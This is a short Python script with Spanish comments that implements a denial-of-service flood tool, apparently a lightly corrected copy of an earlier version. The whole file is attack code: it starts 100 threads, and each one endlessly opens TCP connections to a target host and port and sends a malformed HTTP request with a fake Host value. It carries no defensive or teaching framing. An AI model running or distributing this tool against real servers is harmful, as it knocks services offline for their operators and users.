import socket  # Importa el módulo para comunicaciones de red
import threading  # Importa el módulo para manejar hilos múltiples

# Variables globales
objetivo = ""  # Dirección IP o dominio objetivo
fake_ip = ""   # IP falsa para el encabezado HTTP
puerto = ""    # Puerto objetivo
numero_de_Ataques = 0  # Contador de ataques realizados

def ataque():
    """
    Función que realiza el ataque DoS mediante conexiones TCP
    y solicitudes HTTP malformadas
    """
    while True:
        # Crear un nuevo socket TCP/IP
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Establece conexión con el objetivo
        soc.connect((objetivo, puerto))
        
        # Envía una solicitud HTTP GET malformada
        soc.sendto(("GET /" + objetivo + "HTTP/1.1\r\n").encode('ascii'), 
                   (objetivo, puerto))
        
        # Envía un encabezado Host falso
        soc.sendto(("Host:" + fake_ip + "\r\n\r\n").encode('ascii'), 
                   (objetivo, puerto))

        # Incrementa y muestra el contador de ataques
        global numero_de_Ataques
        numero_de_Ataques += 1  # Nota: hay un error en el original, era '= +1'
        print(f'Bien hecho {objetivo}:{numero_de_Ataques}')

        # Cierra la conexión del socket
        soc.close()

# Crea 100 hilos que ejecutan la función ataque()
for i in range(100):
    thread = threading.Thread(target=ataque)
    thread.start()  # Nota: faltaba el paréntesis en el original